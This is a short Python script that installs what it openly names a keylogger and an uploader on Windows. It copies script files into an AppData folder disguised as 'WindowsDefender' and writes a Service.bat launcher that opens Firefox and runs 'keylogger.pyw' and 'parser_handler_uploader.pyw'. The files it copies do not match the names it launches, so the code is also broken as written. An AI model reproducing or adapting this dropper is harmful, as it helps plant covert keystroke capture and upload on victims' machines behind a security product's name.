import shutil, getpass, os

user = getpass.getuser()

path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\WindowsDefender".format(user)
if not os.path.exists(path):
    os.mkdir(path)

def move(f):
    shutil.copy(f, path)

move("Shannanigans.pyw")
move("OlympicGames.pyw")
move("auth.py")

shan_path = os.path.join(path, "parser_handler_uploader.pyw")
ol_path   = os.path.join(path, "keylogger.pyw")

#make batfile launcher for scripts and browser

with open(os.path.join(path, "Service.bat"), "w") as f:
    f.write("@echo off\n")
    f.write("start Firefox\n")  #browser name
    f.write("python {}\n".format(shan_path)) #path to executables :)
    f.write("python {}\n".format(ol_path)) #path to executables :)

print(path.format(user))
